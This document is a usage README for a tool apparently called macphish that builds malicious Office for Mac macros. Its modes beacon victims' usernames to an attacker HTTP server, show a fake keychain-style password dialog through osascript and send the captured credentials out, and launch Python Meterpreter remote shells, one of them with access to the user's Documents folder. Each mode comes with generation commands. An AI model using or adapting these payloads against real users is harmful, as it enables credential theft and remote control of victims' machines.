# Usage
 
## beacon (Office 2011/Office 2016)
This mode generates a simple 'beacon' payload that will signal a HTTP server. This module is useful for stats/evidence when no access to user files is required. The HTTP request will include the user name that executed the payload. We are using curl here but it is very easy to change it to nslookup, ping, dig, etc.

To generate a beacon payload, simply select 'beacon' as the attack mode and set the listening hostname:

    $./macphish.py -a beacon -lh <host>

## creds (Office 2011/Office 2016)
This module generates payloads for credential phishing. This payload generates a prompt that attempts to phish user credentials abusing osascript functionality. The username is obtained from the system information which is sent along with the entered password to a HTTP server.

To generate the macro:

    $./macphish.py -a creds -m -lh <host> 

To generate the Applescript payload to be executed from a shell:

    $./macphish.py -a creds -lh <host> 
    
To customize the icon, title and message used in the dialog:

    ./macphish.py -lh <host> -a creds -t <title> -msg <msg> -i <icon>

For example, to use the keychain icon:

    ./macphish.py -lh 0xdead -a creds -t "Microsoft Word" -msg "Unlock your keychain to decrypt this file" -i "file \"Applications:Utilities:Keychain Access.app:Contents:Resources:AppIcon.icns\""

## meterpreter (Office 2011/Office 2016 with limitations)
This module generates python meterpreter payloads. In Office 2016, it will run inside the App Sandbox. 

To generate a macro that will execute a Python meterpreter payload (Note that only Python payloads will work):

    $./macphish.py -a meterpreter -lh <host> -lp <port> -p <payload type> -m

## meterpreter-grant (Office 2011/Office 2016)

This payload executes a Python meterpreter after calling GrantAccessToMultipleFiles(/Users/<user>/Documents). The meterpreter shell will have access to user documents if permissions are granted. Additionally, the document must be run from anywhere (including subfolders) inside the Documents folder.

To generate a macro that will execute a Python meterpreter payload (Note that only Python payloads will work):

    $./macphish.py -a meterpreter-grant -lh <host> -lp <port> -p <payload type> -m
